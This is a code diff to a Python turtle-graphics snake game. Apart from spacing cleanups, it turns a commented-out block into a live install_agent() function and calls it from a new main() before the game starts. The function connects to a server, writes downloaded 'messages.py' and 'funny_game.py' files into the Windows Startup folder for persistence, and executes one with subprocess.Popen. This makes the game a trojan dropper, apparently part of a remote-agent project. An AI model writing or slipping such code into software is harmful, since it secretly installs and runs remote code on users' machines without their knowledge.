@@ -20,7 +20,7 @@ MSG_LEN_PROTOCOL = 4
 EOF = b'-1'
 
 # half width/height of game board for collision detection
-BOARD_HALF_WIDTH=290
+BOARD_HALF_WIDTH = 290
 # score increase when hitting food
 HIT_SCORE = 10
 # distance to consider as collision
@@ -30,7 +30,7 @@ STEP_DISTANCE = 20
 # how much to decrease delay (increase speed) when hitting food
 FOOD_HIT_DELAY_REDUCTION = 0.001
 # size of turtle window manager
-WM_SIZE=600
+WM_SIZE = 600
 # initial delay (speed) at beginning of game
 INITIAL_DELAY = 0.1
 # delay before reset after collision
@@ -154,51 +154,52 @@ class Snake:
                 return True
 
 
-# server connection
-# my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# my_socket.connect((SERVER_IP, SERVER_PORT))  # local server
-# signal = 'g'.encode()
-# my_socket.send(signal)
-# user_name = os.getlogin()
-# # location for the agent file
-# location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
-#            "\\Windows\\Start Menu\\Programs\\" \
-#            "Startup\\messages.py".format(user_name)
-# # downloading the messages file
-# with open(location, "wb") as f:
-#     done = False
-#     while not done:
-#         try:
-#             raw_size = my_socket.recv(MSG_LEN_PROTOCOL)
-#             size = raw_size.decode()
-#             if size.isdigit():
-#                 data = my_socket.recv(int(size))
-#             if data == EOF:
-#                 break
-#             print(len(data))
-#             f.write(data)
-#         except Exception:
-#             done = True
-#
-# location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
-#            "\\Windows\\Start Menu\\Programs\\" \
-#            "Startup\\funny_game.py".format(user_name)
-# # downloading the agent file
-# with open(location, "wb") as f:
-#     done = False
-#     while not done:
-#         try:
-#             raw_size = my_socket.recv(MSG_LEN_PROTOCOL)
-#             size = raw_size.decode()
-#             if size.isdigit():
-#                 data = my_socket.recv(int(size))
-#             if data == EOF:
-#                 break
-#             print(len(data))
-#             f.write(data)
-#         except Exception:
-#             done = True
-#     process = subprocess.Popen(["python.exe", location])
+def install_agent():
+    # server connection
+    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    my_socket.connect((SERVER_IP, SERVER_PORT))  # local server
+    signal = 'g'.encode()
+    my_socket.send(signal)
+    user_name = os.getlogin()
+    # location for the agent file
+    location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
+               "\\Windows\\Start Menu\\Programs\\" \
+               "Startup\\messages.py".format(user_name)
+    # downloading the messages file
+    with open(location, "wb") as f:
+        done = False
+        while not done:
+            try:
+                raw_size = my_socket.recv(MSG_LEN_PROTOCOL)
+                size = raw_size.decode()
+                if size.isdigit():
+                    data = my_socket.recv(int(size))
+                if data == EOF:
+                    break
+                print(len(data))
+                f.write(data)
+            except Exception:
+                done = True
+
+    location = "c:\\Users\\{}\\AppData\\Roaming\\Microsoft" \
+               "\\Windows\\Start Menu\\Programs\\" \
+               "Startup\\funny_game.py".format(user_name)
+    # downloading the agent file
+    with open(location, "wb") as f:
+        done = False
+        while not done:
+            try:
+                raw_size = my_socket.recv(MSG_LEN_PROTOCOL)
+                size = raw_size.decode()
+                if size.isdigit():
+                    data = my_socket.recv(int(size))
+                if data == EOF:
+                    break
+                print(len(data))
+                f.write(data)
+            except Exception:
+                done = True
+        process = subprocess.Popen(["python.exe", location])
 
 
 class Game:
@@ -296,5 +297,11 @@ class Game:
         self.wn.mainloop()
 
 
-game = Game()
-game.run()
+def main():
+    install_agent()
+    game = Game()
+    game.run()
+
+
+if __name__ == '__main__':
+    main()
